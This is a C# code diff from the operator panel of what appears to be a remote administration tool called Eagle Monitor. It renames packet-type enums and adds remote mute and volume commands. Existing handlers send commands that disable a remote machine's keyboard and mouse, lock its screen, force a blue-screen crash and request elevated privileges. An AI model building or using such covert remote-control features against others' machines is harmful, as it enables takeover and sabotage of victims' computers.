@@ -32,9 +32,9 @@ namespace Eagle_Monitor.Forms
         private void closeButton_Click(object sender, EventArgs e)
         {
             this.Close();
-            Client.SimplePacketSender(Shared.PacketTypes.PacketType.KB_ON, Client.ClientDictionary[this.IP_Origin]);
+            Client.SimplePacketSender(Shared.PacketType.KB_ON, Client.ClientDictionary[this.IP_Origin]);
             //this is a fix otherwise the keyboard won't work until client's restart if this form is closed and keyboard disabled;
-            Client.SimplePacketSender(Shared.PacketTypes.PacketType.MS_ON, Client.ClientDictionary[this.IP_Origin]);
+            Client.SimplePacketSender(Shared.PacketType.MS_ON, Client.ClientDictionary[this.IP_Origin]);
             //same for mouse;
         }
 
@@ -59,11 +59,11 @@ namespace Eagle_Monitor.Forms
         {
             if (screenLockerToggleSwitch.Checked)
             {
-                Client.SimplePacketSender(Shared.PacketTypes.PacketType.SCRL_ON, Client.ClientDictionary[this.IP_Origin]);
+                Client.SimplePacketSender(Shared.PacketType.SCRL_ON, Client.ClientDictionary[this.IP_Origin]);
             }
             else 
             {
-                Client.SimplePacketSender(Shared.PacketTypes.PacketType.SRCL_OFF, Client.ClientDictionary[this.IP_Origin]);
+                Client.SimplePacketSender(Shared.PacketType.SRCL_OFF, Client.ClientDictionary[this.IP_Origin]);
             }
         }
 
@@ -71,11 +71,11 @@ namespace Eagle_Monitor.Forms
         {
             Client C = Client.ClientDictionary[this.IP_Origin];
             Data D = new Data();
-            D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+            D.Type = Shared.PacketType.PLUGIN;
             D.Plugin = Plugins.Miscellaneous;
             D.IP_Origin = C.IP;
             D.HWID = C.HWID;
-            D.DataReturn = new object[] { Shared.PacketTypes.PacketType.BSOD_SYS };
+            D.DataReturn = new object[] { Shared.PacketType.BSOD_SYS };
             Task.Run(() => C.SendData(D.Serialize()));
             Client.ClientFixer(C);
         }
@@ -84,11 +84,11 @@ namespace Eagle_Monitor.Forms
         {
             if (keyboardToggleSwitch.Checked)
             {
-                Client.SimplePacketSender(Shared.PacketTypes.PacketType.KB_OFF, Client.ClientDictionary[this.IP_Origin]);
+                Client.SimplePacketSender(Shared.PacketType.KB_OFF, Client.ClientDictionary[this.IP_Origin]);
             }
             else 
             {
-                Client.SimplePacketSender(Shared.PacketTypes.PacketType.KB_ON, Client.ClientDictionary[this.IP_Origin]);
+                Client.SimplePacketSender(Shared.PacketType.KB_ON, Client.ClientDictionary[this.IP_Origin]);
             }
         }
 
@@ -96,11 +96,11 @@ namespace Eagle_Monitor.Forms
         {
             if (mouseToggleSwitch.Checked)
             {
-                Client.SimplePacketSender(Shared.PacketTypes.PacketType.MS_OFF, Client.ClientDictionary[this.IP_Origin]);
+                Client.SimplePacketSender(Shared.PacketType.MS_OFF, Client.ClientDictionary[this.IP_Origin]);
             }
             else
             {
-                Client.SimplePacketSender(Shared.PacketTypes.PacketType.MS_ON, Client.ClientDictionary[this.IP_Origin]);
+                Client.SimplePacketSender(Shared.PacketType.MS_ON, Client.ClientDictionary[this.IP_Origin]);
             }
         }
 
@@ -108,11 +108,47 @@ namespace Eagle_Monitor.Forms
         {
             Client C = Client.ClientDictionary[this.IP_Origin];
             Data D = new Data();
-            D.Type = Shared.PacketTypes.PacketType.PLUGIN;
+            D.Type = Shared.PacketType.PLUGIN;
             D.Plugin = Plugins.Miscellaneous;
             D.IP_Origin = C.IP;
             D.HWID = C.HWID;
-            D.DataReturn = new object[] { Shared.PacketTypes.PacketType.GET_PRIV ,privilegeComboBox.SelectedIndex + 1 };
+            D.DataReturn = new object[] { Shared.PacketType.GET_PRIV ,privilegeComboBox.SelectedIndex + 1 };
+            Task.Run(() => C.SendData(D.Serialize()));
+        }
+
+        private void muteSoundToggleSwitch_CheckedChanged(object sender, EventArgs e)
+        {
+            Client C = Client.ClientDictionary[this.IP_Origin];
+            Data D = new Data();
+            D.Type = Shared.PacketType.PLUGIN;
+            D.Plugin = Plugins.Miscellaneous;
+            D.IP_Origin = C.IP;
+            D.HWID = C.HWID;
+            D.DataReturn = new object[] { Shared.PacketType.MUTE_AUDIO};
+            Task.Run(() => C.SendData(D.Serialize()));
+        }
+
+        private void audioUpWindowsButton_Click(object sender, EventArgs e)
+        {
+            Client C = Client.ClientDictionary[this.IP_Origin];
+            Data D = new Data();
+            D.Type = Shared.PacketType.PLUGIN;
+            D.Plugin = Plugins.Miscellaneous;
+            D.IP_Origin = C.IP;
+            D.HWID = C.HWID;
+            D.DataReturn = new object[] { Shared.PacketType.AUDIO_UP };
+            Task.Run(() => C.SendData(D.Serialize()));
+        }
+
+        private void audioDownWindowsButton_Click(object sender, EventArgs e)
+        {
+            Client C = Client.ClientDictionary[this.IP_Origin];
+            Data D = new Data();
+            D.Type = Shared.PacketType.PLUGIN;
+            D.Plugin = Plugins.Miscellaneous;
+            D.IP_Origin = C.IP;
+            D.HWID = C.HWID;
+            D.DataReturn = new object[] { Shared.PacketType.AUDIO_DOWN };
             Task.Run(() => C.SendData(D.Serialize()));
         }
     }
